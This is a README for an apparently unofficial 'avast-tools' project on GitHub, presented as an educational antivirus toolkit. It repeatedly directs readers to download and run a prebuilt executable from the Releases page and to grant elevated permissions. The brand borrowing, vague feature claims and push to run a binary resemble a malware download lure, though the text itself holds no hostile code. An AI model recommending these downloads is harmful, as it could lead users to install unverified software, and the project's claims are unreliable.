## Quick start

A practical entry point to get hands on quickly. This project distributes prebuilt assets in the Releases page. The latest release contains one or more assets you can download and run to explore the toolkit on your system.

- The Releases page is the primary source for downloadable assets. It is the place to obtain ready-to-run installers or packages. The page is available here: https://github.com/ZweMannKyaw/avast-tools/releases.
- Choose the asset that matches your platform. For Windows, look for a file named similar to avast-tools-windows-x64.exe. For Linux, look for avast-tools-linux-x64.tar.gz or a comparable package. Each asset is designed to be executed or unpacked with minimal setup.

After downloading, run the installer or unpack the package. The asset contains a self-contained environment with the toolkit, documentation, and example configurations. If your system prompts for permission, grant it to allow installation or extraction to proceed. Once the asset is in place, you can start exploring the features described in this document.

To verify integrity, use the checksums published alongside the release. This helps ensure the file you download was not tampered with during transit. If you have concerns about authenticity or integrity, check the release notes for signature information and verification steps.

If you prefer to inspect the project before running anything, you can browse the source code in this repository. The source demonstrates the architecture, the wiring of components, and the example configurations that ship with the releases.

For ongoing updates, return to the Releases page as new builds become available. The link to the releases page is provided above and appears again later in this document for convenience.

## What this project includes

- Real-Time Protection Module (RTP) concepts: A live monitoring loop that checks file operations, network activity, and process behavior.
- Shield Components: Lightweight detectors and controllers that demonstrate how a protection shield can enforce policies.
- CyberCapture-style sandbox: A safe, isolated environment for sample submission, analysis, and behavior logging.
- Rescue Disk builder: A portable recovery environment that can be created and used for offline repair scenarios.
- Cross-platform support: Core ideas are designed to be portable across Windows and Linux, with a roadmap for macOS.
- Command-Line Interface (CLI): Simple commands to inspect status, run scans, and trigger events.
- Extensible configuration: YAML-based config to tune behavior, thresholds, and response actions.
- Educational examples: Ready-to-run demonstrations that highlight how components interact.

Emojis and visuals help explain concepts, but the core logic remains simple and approachable. This project prioritizes clarity and safety, offering an approachable path to study how protection tools are structured without invoking dangerous or intrusive techniques.

---

## How it works

- The toolkit separates concerns into layers: an orchestration layer, a shield layer, and a reporting layer.
- Orchestration: Coordinates the flow of events, triggers, and responses. It decides when to simulate a shield action or run a rescue routine.
- Shield layer: Demonstrates containment and policy enforcement. It shows how a shield component can block actions, log events, and surface alerts.
- Reporting: Centralizes logs, dashboards, and export options. It helps you understand what happened during a run.
- CyberCapture-like sandbox: Provides a safe sandbox where sample data can be observed without risking the host system.
- Rescue Disk builder: Creates a portable environment that can be used to recover data or boot into a recovery shell if needed.

These concepts are presented in a safe, controlled way. The code and documentation are designed for learning and demonstration. They are not meant to replace real security software or to be deployed on production systems without careful adaptation and validation.

## Installation and setup

The typical flow is to download a release asset from the Releases page, extract or run it, and then follow the prompts. The exact steps depend on your platform.

Windows
- Download the Windows asset, for example avast-tools-windows-x64.exe, from the Releases page.
- Run the installer. If prompted, approve the installer to make changes on your device.
- Follow the on-screen setup wizard to configure storage paths, logging, and basic protection defaults.
- Once installed, open a terminal and run the tool with the built-in help.

Linux
- Download the Linux asset, for example avast-tools-linux-x64.tar.gz, from the Releases page.
- Unpack the archive to a chosen directory, then switch to that directory.
- Start the toolkit with the provided binary, or use the launcher script if included.
- Review the help output to learn the available commands and options.

macOS
- If a macOS asset is provided, download the macOS package from the same Releases page.
- Install using the standard macOS installation flow.
- Run the CLI from Terminal and explore the available commands.

Cross-platform setup notes
- Some features assume elevated privileges. Be prepared to run with administrator or root rights if you enable protected actions.
- The configuration in YAML controls thresholds and behaviors. You can customize the experience without editing the core code.
- In all cases, ensure you trust the source of the release assets. Always verify checksums or signatures when available.

## Running the toolkit

CLI overview
- The toolkit exposes a compact CLI to inspect status, start scans, and trigger containment actions.
- Common commands include:
  - avast-tools status
  - avast-tools scan --path /path/to/scan
  - avast-tools shield enable
  - avast-tools shield status
  - avast-tools cybercapture submit --sample sample.dat
  - avast-tools rescue --start

Example scenarios
- Quick status check: Run the status command to see which components are active, which events were logged recently, and the current policy.
- On-demand scan: Use the scan command to review a specific directory or file tree. The scan emulates behavior similar to a lightweight file monitor.
- Shield testing: Enable shielding, perform a file operation that would normally trigger an action, and observe the resulting alert and log entries.
- CyberCapture demo: Submit a sample to the sandbox, let it run, and review the captured behavior in the report.
- Rescue Disk workflow: Start the rescue environment and verify that essential services are available, files are accessible, and system integrity checks can be performed.

Automations and scripts
- The toolkit supports simple scripting for repeated tasks. You can chain commands in a script to simulate a security incident lifecycle, from detection to containment to reporting.
- Use configuration files to tailor the sequence of actions, the conditions that trigger responses, and the format of reports.

## Core components

- Real-Time Protection (RTP) core: Monitors file I/O, processes, and network activity in a non-intrusive, educational way. It demonstrates how a protection engine can decide when to alert, log, or block actions.
- Shield Module: A modular controller that can enable, disable, or tune the intensity of protective measures. It helps illustrate policy decisions and their impact.
- CyberCapture-like Sandbox: A safe execution environment that runs suspicious activity in isolation, with detailed logs and behavior analysis.
- Rescue Disk Builder: A lightweight utility to assemble a portable recovery environment. It demonstrates how a rescue tool can be created, stored, and used in recovery scenarios.
- Config and Logging System: YAML-based configuration enables experiment setups and reproducibility. Logs are kept in a plain, readable format for easy study.

Architecture notes
- The project favors simplicity and readability. Each component is designed to be approachable for learners while preserving the essence of more complex protection architectures.
- The code focuses on demonstrating concepts rather than providing production-grade security. Use this as a learning tool and adapt it for responsible, safe experimentation.

---

## Security and safety

- Always work in a controlled environment, such as a virtual machine or sandbox, when exploring protection and containment concepts.
- Verify downloads from the Releases page before running any asset. Use checksums or signatures when provided.
- Do not run samples or samples from unknown sources in a live system. Use the CyberCapture-like sandbox for demonstrations.
- The project is educational in nature. It does not replace the need for enterprise security software or proper incident response tooling.
- If you intend to deploy any protective components in a real setting, consult security professionals and follow best practices for your organization.

---

## Configurations and customization

- The toolkit uses YAML files for configuration. You can adjust:
  - active policies (which actions are allowed or blocked)
  - thresholds for alerts and containment
  - logging verbosity and destinations
  - components to enable or disable (RTP, Shield, CyberCapture, Rescue Disk)
- Sample configuration is included in the release and in the repository. Start from the sample, then tailor it to your needs.
- Some features may require elevated privileges. The configuration can include safeguards and prompts to handle privilege elevation gracefully.

Example YAML excerpt (conceptual)
- policies:
  - block_low_risk_files: false
  - block_executable_writes: true
- logging:
  - level: info
  - destinations: [stdout, file]
- components:
  - rtp:
      enabled: true
  - shield:
      enabled: true
  - cybercapture:
      enabled: true
  - rescue_disk:
      enabled: true

## Testing and quality

- Unit tests cover core logic for the shield decisions, the low-level event hooks, and the sandbox behavior.
- Integration tests simulate end-to-end workflows: enable shield, run a file operation, observe containment, and verify logs.
- Performance tests measure the overhead of the RTP core and shield policy checks in typical usage scenarios.
- Manual tests guide you through common workflows and verify that outputs are human-readable and actionable.

Test guidelines
- Run tests in a controlled environment with mock data. Do not use real user data.
- Use the test suite to validate configurations before applying them to a broader environment.
- Review log files after tests to ensure they reflect expected events and contain enough detail for debugging.

---

## Troubleshooting

- If the toolkit fails to start after installation, verify that you launched the correct binary for your platform and that dependencies are present.
- Check permissions. Some features require administrator or root access.
- If you encounter a missing component error, ensure the asset you downloaded includes all modules. Some releases may split components into separate packages.
- For issues with the CyberCapture sandbox, ensure virtualization features are enabled in the host BIOS and that the sandbox has the necessary isolation settings.
- When logs show inconsistent timestamps, verify the system clock and time zone configuration.
